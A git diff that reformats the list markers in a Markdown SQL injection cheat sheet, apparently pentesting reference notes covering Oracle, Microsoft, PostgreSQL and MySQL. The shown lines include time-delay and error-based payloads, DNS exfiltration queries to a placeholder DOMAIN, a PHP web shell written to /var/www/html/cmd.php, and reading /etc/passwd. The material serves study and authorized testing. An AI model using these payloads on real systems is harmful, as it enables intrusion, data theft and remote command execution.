@@ -22,19 +22,19 @@ tags:
 
 ### Concatenar querys
 
-1. Oracle, PostgreSQL
+- Oracle, PostgreSQL
 
 ```sql
 'foo'||'bar'
 ```
 
-2. Microsoft
+- Microsoft
 
 ```sql
 'foo'+'bar'
 ```
 
- 3. MySQL
+- MySQL
 
 ```sql
 'foo' 'bar'
@@ -43,13 +43,13 @@ concat('foo','bar')
 
 ### Substring
 
-1. Oracle
+- Oracle
 
 ```sql
 substr('foobar',1,1)
 ```
 
-2. Microsoft, PostgreSQL, MySQL
+- Microsoft, PostgreSQL, MySQL
 
 ```sql
 substring('foobar',1,1)
@@ -57,27 +57,27 @@ substring('foobar',1,1)
 
 ### Comments
 
-1. Oracle
+- Oracle
 
 ```sql
 --comment
 ```
 
-2. Microsoft
-
-```sql
---comment
-/*comment*/
-```
-
-3. PostgreSQL
+- Microsoft
 
 ```sql
 --comment
 /*comment*/
 ```
 
-4. MySQL
+- PostgreSQL
+
+```sql
+--comment
+/*comment*/
+```
+
+- MySQL
 
 ```sql
 #comment
@@ -87,20 +87,20 @@ substring('foobar',1,1)
 
 ### Database version
 
-1. Oracle
+- Oracle
 
 ```sql
 select banner from v$version
 select version from v$instance
 ```
 
-2. Microsoft, MySQL
+- Microsoft, MySQL
 
 ```sql
 select @@version
 ```
 
-3. PostgreSQL
+- PostgreSQL
 
 ```sql
 select version()
@@ -108,14 +108,14 @@ select version()
 
 ### Database contents
 
-1. Oracle 
+- Oracle 
 
 ```sql
 select table_name from all_tables
 select column_name from all_tab_columns
 ```
 
-2. Microsoft, PostgreSQL, MySQL
+- Microsoft, PostgreSQL, MySQL
 
 ```sql
 select schema_name from information_schema.schemata
@@ -125,25 +125,25 @@ select column_name from information_schema.columns
 
 ### Conditional errors
 
-1. Oracle
+- Oracle
 
 ```sql
 select case when('CONDITION') then to_char(1/0) else NULL end from dual
 ```
 
-2. Microsoft
+- Microsoft
 
 ```sql
 select case when('CONDITION') then 1/0 else NULL end
 ```
 
-3. PostgreSQL
+- PostgreSQL
 
 ```sql
 1 = (select case when ('CONDITION') then 1/(select 0) else NULL end)
 ```
 
-4. MySQL
+- MySQL
 
 ```sql
 select if('CONDITION',(select table_name from information_schema.tables),'a')
@@ -151,21 +151,21 @@ select if('CONDITION',(select table_name from information_schema.tables),'a')
 
 ### Extracting data via visible error messages
 
-1. Microsoft
+- Microsoft
 
 ```sql
 select 'foo' where 1=(select 'test')
 > Conversion failed when converting the varchar value 'test' to data type int.
 ```
 
-2. PostgreSQL
+- PostgreSQL
 
 ```sql
 select cast((select 'test') as int)
 > invalid input syntax for integer: "test"
 ```
 
-3. MySQL
+- MySQL
 
 ```sql
 select 'foo' where 1=1 and extractvalue(1,concat(0x5c,(select 'test')))
@@ -174,14 +174,14 @@ select 'foo' where 1=1 and extractvalue(1,concat(0x5c,(select 'test')))
 
 ### Batched (or stacked) queries
 
-1. Microsoft
+- Microsoft
 
 ```sql
 select 'query1'; select 'query2'
 select 'query1' select 'query2'
 ```
 
-2. PostgreSQL, MySQL
+- PostgreSQL, MySQL
 
 ```sql
 select 'query1'; select 'query2'
@@ -189,25 +189,25 @@ select 'query1'; select 'query2'
 
 ### Time delays
 
-1. Oracle
+- Oracle
 
 ```sql
 dbms_pipe.receive_message(('a'),10)
 ```
 
-2. Microsoft
+- Microsoft
 
 ```sql
 waitfor delay '0:0:10'
 ```
 
-3. PostgreSQL
+- PostgreSQL
 
 ```sql
 pg_sleep(10)
 ```
 
-4. MySQL
+- MySQL
 
 ```sql
 sleep(10)
@@ -215,25 +215,25 @@ sleep(10)
 
 ### Conditional time delays
 
-1. Oracle
+- Oracle
 
 ```sql
 select case when('CONDITION') then 'a'||dbms_pipe.receive_message(('a'),10) else NULL end from dual
 ```
 
-2. Microsoft
+- Microsoft
 
 ```sql
 if ('CONDITION') waitfor delay '0:0:10'
 ```
 
-3. PostgreSQL
+- PostgreSQL
 
 ```sql
 select case when('CONDITION') then pg_sleep(10) else pg_sleep(0) end
 ```
 
-4. MySQL
+- MySQL
 
 ```sql
 select if('CONDITION',sleep(10),'a') 
@@ -241,7 +241,7 @@ select if('CONDITION',sleep(10),'a')
 
 ### DNS lookup
 
-1. Oracle
+- Oracle
 
 ```sql
 select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://DOMAIN/"> %remote;]>'),'/l') from dual
@@ -251,19 +251,19 @@ select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE roo
 select UTL_INADDR.get_host_address('DOMAIN')
 ```
 
-2. Microsoft
+- Microsoft
 
 ```sql
 exec master..xp_dirtree '//DOMAIN/a' 
 ```
 
-3. PostgreSQL
+- PostgreSQL
 
 ```sql
 copy (select '') to program 'nslookup DOMAIN'
 ```
 
-4. MySQL
+- MySQL
 
 ```sql
 load_file('\\\\DOMAIN\\a')
@@ -272,13 +272,13 @@ select ... into OUTFILE '\\\\DOMAIN\a'
 
 ### DNS lookup with data exfiltration
 
-1. Oracle
+- Oracle
 
 ```sql
 select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select 'test')||'.DOMAIN/"> %remote;]>'),'/l') from dual
 ```
 
-2. Microsoft
+- Microsoft
 
 ```sql
 declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.DOMAIN/a"')
@@ -288,7 +288,7 @@ declare p text;
 begin
 ```
 
-3. PostgreSQL
+- PostgreSQL
 
 ```sql
 SELECT into p (SELECT YOUR-QUERY-HERE);
@@ -299,7 +299,7 @@ $$ language plpgsql security definer;
 SELECT f();
 ```
 
-4. MySQL
+- MySQL
 
 ```sql
 select 'test' into OUTFILE '\\\\DOMAIN\a'
@@ -307,13 +307,13 @@ select 'test' into OUTFILE '\\\\DOMAIN\a'
 
 ### Special Functions
 
-1. Insert Files
+- Insert Files
 
 ```sql
 select '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/cmd.php'
 ```
 
-2. Read Files
+- Read Files
 
 ```sql
 select load_file('/etc/passwd')
